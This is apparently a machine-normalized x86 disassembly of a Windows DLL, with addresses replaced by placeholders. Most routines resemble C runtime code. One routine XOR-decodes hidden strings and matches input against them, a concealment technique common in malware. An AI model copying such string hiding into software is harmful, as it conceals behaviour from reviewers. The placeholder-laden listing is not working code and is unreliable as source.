je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ ecx ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov ecx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
jne r-xdata
push ebx
push edx
push edi
call sub_10078600
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ecx edi
sub ecx edx
add [ esi + 0x3c ] ecx
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov eax [ ebp + 0x8 ]
push edx
call sub_10065045
add esp 0x4
sub_100582b2
push 0x34
mov eax sub_1007e6a6
call sub_10007703
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ edi ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
xor edx edx
mov [ ebp - 0x40 ] eax
cmp cx si
je r-xdata
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov eax ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax [ ebp - 0x3c ]
call sub_10019c00
retn
movzx eax [ edi + ebx * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ edi + edx * 2 ]
cmp ax si
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx ecx [ edi ]
cmp ax cx
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc ebx
movzx eax [ edi + ebx * 2 ]
test ax ax
jne r-xdata
add ebx [ ebp - 0x34 ]
movzx eax [ edi + ebx * 2 ]
cmp ax [ edi ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp ax cx
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test ax ax
je r-xdata
movsx eax [ eax + esi ]
add ebx eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10060ea7
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov ax [ edi + ebx * 2 ]
cmp ax [ ecx + 0x6 ]
jne r-xdata
call sub_1001e1bc
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10060ea7
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1001e1ec
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor ebx ebx
xor esi esi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
sub_10058442
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1007b12c
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10058482
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10048623
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100036b3
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100036b3
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_10058570
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_1004e415
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_1004e415
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_1004e415
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_1004e415
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100520c2
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_1004e415
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_10058754
push 0x10
mov eax sub_1007e247
call sub_1005d45e
mov esi ecx
mov [ ebp - 0x18 ] esi
call sub_1001bc97
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_1001a1b3
retn 0x8
call sub_1006312b
mov [ esi + 0xc ] 0x2e
call sub_1006312b
mov [ esi + 0xd ] 0x2c
call sub_1006312b
lea eax [ ebp - 0x1c ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10047b65
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1006312b
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10047b65
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_1006312b
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10047b65
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_1006312b
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_1006312b
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
cmp [ ebp + 0xc ] bl
je r-xdata
sub_10058824
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10020a90
push [ esi + 0x8 ]
call sub_10020a90
push [ esi + 0xc ]
call sub_10020a90
push [ esi + 0x10 ]
call sub_10020a90
push [ esi + 0x14 ]
call sub_10020a90
push [ esi + 0x18 ]
call sub_10020a90
push [ esi ]
call sub_10020a90
push [ esi + 0x20 ]
call sub_10020a90
push [ esi + 0x24 ]
call sub_10020a90
push [ esi + 0x28 ]
call sub_10020a90
push [ esi + 0x2c ]
call sub_10020a90
push [ esi + 0x30 ]
call sub_10020a90
push [ esi + 0x34 ]
call sub_10020a90
push [ esi + 0x1c ]
call sub_10020a90
push [ esi + 0x38 ]
call sub_10020a90
push [ esi + 0x3c ]
call sub_10020a90
add esp 0x40
push [ esi + 0x40 ]
call sub_10020a90
push [ esi + 0x44 ]
call sub_10020a90
push [ esi + 0x48 ]
call sub_10020a90
push [ esi + 0x4c ]
call sub_10020a90
push [ esi + 0x50 ]
call sub_10020a90
push [ esi + 0x54 ]
call sub_10020a90
push [ esi + 0x58 ]
call sub_10020a90
push [ esi + 0x5c ]
call sub_10020a90
push [ esi + 0x60 ]
call sub_10020a90
push [ esi + 0x64 ]
call sub_10020a90
push [ esi + 0x68 ]
call sub_10020a90
push [ esi + 0x6c ]
call sub_10020a90
push [ esi + 0x70 ]
call sub_10020a90
push [ esi + 0x74 ]
call sub_10020a90
push [ esi + 0x78 ]
call sub_10020a90
push [ esi + 0x7c ]
call sub_10020a90
add esp 0x40
push [ esi + 0x80 ]
call sub_10020a90
push [ esi + 0x84 ]
call sub_10020a90
push [ esi + 0x88 ]
call sub_10020a90
push [ esi + 0x8c ]
call sub_10020a90
push [ esi + 0x90 ]
call sub_10020a90
push [ esi + 0x94 ]
call sub_10020a90
push [ esi + 0x98 ]
call sub_10020a90
push [ esi + 0x9c ]
call sub_10020a90
push [ esi + 0xa0 ]
call sub_10020a90
push [ esi + 0xa4 ]
call sub_10020a90
push [ esi + 0xa8 ]
call sub_10020a90
push [ esi + 0xbc ]
call sub_10020a90
push [ esi + 0xc0 ]
call sub_10020a90
push [ esi + 0xc4 ]
call sub_10020a90
push [ esi + 0xc8 ]
call sub_10020a90
push [ esi + 0xcc ]
call sub_10020a90
add esp 0x40
push [ esi + 0xd0 ]
call sub_10020a90
push [ esi + 0xb8 ]
call sub_10020a90
push [ esi + 0xd8 ]
call sub_10020a90
push [ esi + 0xdc ]
call sub_10020a90
push [ esi + 0xe0 ]
call sub_10020a90
push [ esi + 0xe4 ]
call sub_10020a90
push [ esi + 0xe8 ]
call sub_10020a90
push [ esi + 0xec ]
call sub_10020a90
push [ esi + 0xd4 ]
call sub_10020a90
push [ esi + 0xf0 ]
call sub_10020a90
push [ esi + 0xf4 ]
call sub_10020a90
push [ esi + 0xf8 ]
call sub_10020a90
push [ esi + 0xfc ]
call sub_10020a90
push [ esi + 0x100 ]
call sub_10020a90
push [ esi + 0x104 ]
call sub_10020a90
push [ esi + 0x108 ]
call sub_10020a90
add esp 0x40
push [ esi + 0x10c ]
call sub_10020a90
push [ esi + 0x110 ]
call sub_10020a90
push [ esi + 0x114 ]
call sub_10020a90
push [ esi + 0x118 ]
call sub_10020a90
push [ esi + 0x11c ]
call sub_10020a90
push [ esi + 0x120 ]
call sub_10020a90
push [ esi + 0x124 ]
call sub_10020a90
push [ esi + 0x128 ]
call sub_10020a90
push [ esi + 0x12c ]
call sub_10020a90
push [ esi + 0x130 ]
call sub_10020a90
push [ esi + 0x134 ]
call sub_10020a90
push [ esi + 0x138 ]
call sub_10020a90
push [ esi + 0x13c ]
call sub_10020a90
push [ esi + 0x140 ]
call sub_10020a90
push [ esi + 0x144 ]
call sub_10020a90
push [ esi + 0x148 ]
call sub_10020a90
add esp 0x40
push [ esi + 0x14c ]
call sub_10020a90
push [ esi + 0x150 ]
call sub_10020a90
push [ esi + 0x154 ]
call sub_10020a90
push [ esi + 0x158 ]
call sub_10020a90
push [ esi + 0x15c ]
call sub_10020a90
push [ esi + 0x160 ]
call sub_10020a90
add esp 0x18
sub_10058ba0
push ebp
mov ebp esp
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc2
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff5
and edx 0xff
mov [ ebp + eax * 2 - 0x64 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff3
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x68 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe3
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x10 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2e
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1a ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x42
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd0
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8c ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffdd
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x48 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb9
and edx 0xff
mov [ ebp + eax * 2 - 0xe0 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xc4 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x71
and edx 0xff
mov [ ebp + eax * 2 - 0x88 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x78 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8d
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x38 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd3
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
mov [ ebp - 0xa6 ] ax
mov eax [ ebp + 0x8 ]
dec eax
push esi
cmp eax 0x5
ja r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
jmp [ eax * 4 + jump_table_10058fd4 ]
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
je r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0x34 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea eax [ ebp - 0x44 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
push edx
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xa4 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x88 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x18 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x54 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xc0 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_10058fec
push 0xc
push r--data
call sub_10078b50
push 0xe
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10059053
call sub_10078b95
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10020a90
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10020a90
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1005905c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10042d7c
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_10012991
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_100249b4
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_100590e1
push 0xc
mov eax sub_1007e55c
call sub_1005d45e
mov esi ecx
mov [ ebp - 0x18 ] esi
mov edi [ ebp + 0x8 ]
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax edi
pop ebx
div ebx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp edx eax
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push 0x0
push eax
call sub_10011f28
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov edi 0x7ffffffe
mov eax edi
sub eax edx
cmp ecx eax
ja r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea edi [ edx + ecx ]
push 0x0
push 0x1
mov ecx esi
call sub_1004dbe5
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jae r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
call sub_1001a1b3
retn 0x8
mov eax esi
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ecx [ ebx + ebx ]
push ecx
push eax
push [ ebp + 0x8 ]
call sub_10078600
add esp 0xc
sub_10059144
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10011f28
pop ecx
mov [ ebp + 0x8 ] eax
pop ecx
mov eax r-xdata
retn
sub_100591ce
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_10078970
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10078600
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1002788e
mov eax esi
jmp r-xdata
sub_10059250
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ esi + 0x10 ] eax
push 0xffffffff
push eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi ] al
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
mov ecx esi
call sub_100146b0
mov eax esi
mov esp ebp
pop ebp
retn 0x4
sub_1005927e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_100611fe
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_1002a730
push esi
call sub_10065045
pop ecx
sub_100592bc
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov esi ebx
call sub_10054678
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x34 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x28 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_100159e2
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_1001252f
add esp 0xc
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x24 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
